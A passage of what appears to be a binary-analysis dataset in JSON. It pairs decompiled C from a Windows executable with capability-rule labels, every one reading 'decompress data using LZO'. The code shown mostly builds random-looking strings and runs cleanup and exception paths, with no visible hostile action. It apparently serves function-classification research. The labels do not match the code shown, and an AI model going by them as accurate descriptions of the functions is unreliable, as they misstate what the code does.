*(in_stack_00000044 + -4),  0x1f < (in_stack_00000044 + -4) - iVar2)) goto code_r0x00412f7c;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000078) {\n            iVar2 = in_stack_00000064;\n            if ((0xfff < in_stack_00000078 + 1) &&\n               (iVar2 = *(in_stack_00000064 + -4),  0x1f < (in_stack_00000064 + -4) - iVar2)) goto code_r0x00412f88;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = aiStack64[0];\n    if ((uStack44 + 1 < 0x1000) || (iVar2 = *(aiStack64[0] + -4),  (aiStack64[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00412e25;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00412f64:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00412f70:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00412f7c:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00412f88:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1128
    },
    "0040416f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040416f(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack44;\n    uint uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ce00;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    pcStack112 = \"woigkgffmfhivazjwmdg\";\n    auStack120[0] = 0x14;\n    fcn.00402f72();\n    uStack40 = 0xf;\n    uStack44 = 0xb;\n    uStack60 = 0x65677678;\n    uStack56 = 0x67737668;\n    uStack52 = 0x62776a;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x4c, uStack36, \"lgkxevntfiouehzthxkuboyjagxnyxsezlhkalzuynztjdqrqyhdjqjhcrlzwsqzrexzluqcuruf\");\n    param_1[5] = 0xf;\n    param_1[4] = 9;\n    *param_1 = 0x64647165;\n    param_1[1] = 0x626d6973;\n    *(param_1 + 2) = 0x6d;\n    if (0xf < uStack88) {\n        iVar2 = iStack108;\n        if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0044aa10;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < uStack64) {\n        iVar2 = iStack84;\n        if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2)) {\ncode_r0x0044aa10:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            puVar1 = fcn.00403a76();\n            return puVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 779
    },
    "0040426e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.0040426e(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    uint uStack108;\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x414960;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack88 = 0xf;\n    uStack92 = 3;\n    uStack108 = 0x747067;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 2;\n    pcStack112 = \"tyzphymzyrkdfabtbiutowmsaehpblqkkjcakstfhknglgfyrmipdchrwlkskiwfzhbwmvpnzgwtbcoriqrenyyzybzncupjasc\";\n    auStack120[0] = 99;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x28, uStack36, \"dljgcsvdzhmahisbwkjohiiuzdbilvpttfznzbqx\");\n    if (0xf < uStack40) {\n        iVar1 = iStack60;\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0041125f;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < uStack64) {\n        iVar1 = iStack84;\n        if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1)) {\ncode_r0x0041125f:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            return;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 654
    },
    "004042af": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.004042af(uint32_t param_1)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    uint in_stack_0000003c;\n    uint32_t in_stack_00000040;\n    uint *in_stack_00000058;\n    uint32_t in_stack_0000006c;\n    uint uStack188;\n    uchar uStack184;\n    char *pcStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    uchar uStack104;\n    uint *puStack100;\n    int32_t *piStack96;\n    uint uStack92;\n    uint uStack88;\n    uint *puStack84;\n    uint32_t uStack80;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack84 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c4b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x0042dae7:\n        ppuStack32 = ppuVar1;\n        in_stack_00000014 = 0;\n        in_stack_00000018 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (0xf < in_stack_00000040) {\n            uStack80 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (uStack80 = *(in_stack_0000002c - 4),  unaff_EDI = uStack80,  0x1f < (in_stack_0000002c - 4) - uStack80))\n            goto code_r0x0042db97;\n            fcn.00401a32(uStack80);\n        }\n        in_stack_0000003c = 0;\n        in_stack_00000040 = 0xf;\n        in_stack_0000002c = in_stack_0000002c & 0xffffff00;\n        if (in_stack_0000006c < 0x10) {\ncode_r0x0042db72:\n            *in_FS_OFFSET = piStack28;\n            return *0x5421c0;\n        }\n        puStack84 = in_stack_00000058;\n        if ((in_stack_0000006c + 1 < 0x1000) ||\n           (puStack84 = in_stack_00000058[-1],  uStack80 = unaff_EDI,  in_stack_00000058 + (-4 - puStack84) < 0x20)) {\n            fcn.00401a32(puStack84);\n            goto code_r0x0042db72;\n        }\n    }\n    else {\n        uStack80 = param_1;\n        if ((in_stack_00000018 + 1 < 0x1000) ||\n           (uStack80 = *(param_1 - 4),  unaff_EDI = uStack80,  (param_1 - 4) - uStack80 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack80);\n            ppuVar1 = ppuStack32;\n            goto code_r0x0042dae7;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x0042db97:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack100 = &uStack188;\n    uStack88 = 0xffffffff;\n    uStack92 = 0x44c4c0;\n    piStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack96;\n    uStack160 = 0;\n    uStack156 = 0xf;\n    iStack176 = 0;\n    uStack184 = iStack128;\n    pcStack180 = \"grngibklvjpnrbuvjizpxazrgpr\";\n    uStack188 = 0x1b;\n    fcn.00402f72();\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack88 = 2;\n    fcn.00402f72(0x1b, iStack152, \"grngibklvjpnrbuvjizpxazrgpr\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack88 = 3;\n    fcn.00402f72(0x1b, uStack104, \"grngibklvjpnrbuvjizpxazrgpr\");\n    if (uStack132 < 0x10) {\ncode_r0x0042dd03:\n        if (0xf < uStack108) {\n            iVar2 = iStack128;\n            if ((0xfff < uStack108 + 1) && (iVar2 = *(iStack128 + -4),  0x1f < (iStack128 + -4) - iVar2))\n            goto code_r0x0042dd94;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack156) {\n            iVar2 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar2 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar2))\n            goto code_r0x0042dda0;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack96;\n        return *0x5421c4;\n    }\n    iVar2 = iStack152;\n    if ((uStack132 + 1 < 0x1000) || (iVar2 = *(iStack152 + -4),  (iStack152 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042dd03;\n    }\n    uStack88 = 0;\n    fcn.004047f5();\ncode_r0x0042dd94:\n    uStack88 = 1;\n    fcn.004047f5();\ncode_r0x0042dda0:\n    uStack88 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 1666
    },
    "00404377": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00404377(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x4149b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    pcStack88 = \"qnnonbmqwpaxjkkifinjkoalenqvjtasnliasydin\";\n    auStack96[0] = 0x29;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(99, uStack36, \n                 \"mujhjnajzzdkemtkeuofjgfkjbpieescvndedhcfyywjpuiceyzfbhdfaylwoqfcvurwmajsotghedzyfbuqpihpomtvxvppaww\");\n    if (0xf < uStack40) {\n        iVar2 = iStack60;\n        if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x00411ff6;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < uStack64) {\n        iVar2 = iStack84;\n        if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2)) {\ncode_r0x00411ff6:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            uVar1 = fcn.00403a76();\n            return uVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return 0x103f;\n}\n",
        "token_count": 634
    },
    "00404395": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00404395(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_0000004c;\n    uint32_t in_stack_00000060;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44c420;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    pcStack112 = \"vosvbhfxzacdhxthawvetgsyixylvrqmkagifocwuxkshkysoknbm\";\n    auStack120[0] = 0x35;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x35, uStack84, \"vosvbhfxzacdhxthawvetgsyixylvrqmkagifocwuxkshkysoknbm\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x35, uStack36, \"vosvbhfxzacdhxthawvetgsyixylvrqmkagifocwuxkshkysoknbm\");\n    if (uStack64 < 0x10) {\ncode_r0x0042c42a:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0042c694;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x35, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \n                     \"vosvbhfxzacdhxthawvetgsyixylvrqmkagifocwuxkshkysoknbm\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x35, uStack36, \"vosvbhfxzacdhxthawvetgsyixylvrqmkagifocwuxkshkysoknbm\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0042c6a0;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042c6ac;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0042c6b8;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x0042c6c4;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar2 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar2 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar2)) goto code_r0x0042c6d0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000060) {\n            iVar2 = in_stack_0000004c;\n            if ((0xfff < in_stack_00000060 + 1) &&\n               (iVar2 = *(in_stack_0000004c + -4),  0x1f < (in_stack_0000004c + -4) - iVar2)) goto code_r0x0042c6dc;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x5421b8;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x0042c41e:\n        fcn.00401a32(uVar1);\n        goto code_r0x0042c42a;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x0042c41e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042c694:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042c6a0:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042c6ac:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042c6b8:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0042c6c4:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0042c6d0:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0042c6dc:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 1911
    },
    "0040443a": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.0040443a(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    uint32_t in_stack_ffffff2c;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    ushort uStack96;\n    uchar uStack94;\n    uint uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44cdc0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 8;\n    pcStack160 = \"ouddfdogaptmnyzbmuellpxejwnkyislcetekhqebjjclajizhrjzjoulxilczztoqdiemyckspldebzlsoshtkdqofpridum\";\n    auStack168[0] = 0x61;\n    fcn.00402f72();\n    uStack88 = 0xf;\n    uStack92 = 0xe;\n    uStack108 = 0x686b6965;\n    uStack104 = 0x79727171;\n    uStack100 = 0x66626771;\n    uStack96 = 0x7461;\n    uStack94 = 0;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x34, iStack60, \"xdicsfwvkoadoccbcjpzrnzqprnlnhvfkohlqpszrxnavvpekuvn\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x61, uStack84, \n                 \"ouddfdogaptmnyzbmuellpxejwnkyislcetekhqebjjclajizhrjzjoulxilczztoqdiemyckspldebzlsoshtkdqofpridum\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x61, uStack36, \n                 \"ouddfdogaptmnyzbmuellpxejwnkyislcetekhqebjjclajizhrjzjoulxilczztoqdiemyckspldebzlsoshtkdqofpridum\");\n    if (uStack64 < 0x10) {\ncode_r0x0044971a:\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00449975;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x61, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \n                     \"ouddfdogaptmnyzbmuellpxejwnkyislcetekhqebjjclajizhrjzjoulxilczztoqdiemyckspldebzlsoshtkdqofpridum\"\n                    );\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x61, uStack36, \n                     \"ouddfdogaptmnyzbmuellpxejwnkyislcetekhqebjjclajizhrjzjoulxilczztoqdiemyckspldebzlsoshtkdqofpridum\"\n                    );\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x00449981;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0044998d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00449999;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x004499a5;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x004499b1;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar2 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar2 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar2)) goto code_r0x004499bd;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542ac4;\n    }\n    in_stack_ffffff2c = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff2c < 0x1000) {\ncode_r0x0044970e:\n        fcn.00401a32(uVar1);\n        goto code_r0x0044971a;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff2c = uStack64 + 0x24;\n        goto code_r0x0044970e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00449975:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00449981:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0044998d:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00449999:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004499a5:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x004499b1:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x004499bd:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2177
    },
    "004044d5": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004044d5(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44c820;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 4;\n    pcStack112 = \"ywdmcqrqozizvtkjbtzmssancvxvlrnrhhdcckcwtcsugqzveqnwnjls\";\n    auStack120[0] = 0x38;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x38, iStack84, \"ywdmcqrqozizvtkjbtzmssancvxvlrnrhhdcckcwtcsugqzveqnwnjls\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x38, uStack36, \"ywdmcqrqozizvtkjbtzmssancvxvlrnrhhdcckcwtcsugqzveqnwnjls\");\n    if (uStack64 < 0x10) {\ncode_r0x0043808a:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x00438154;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x00438160;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x0043816c;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043808a;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00438154:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00438160:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043816c:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1003
    },
    "004058b7": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
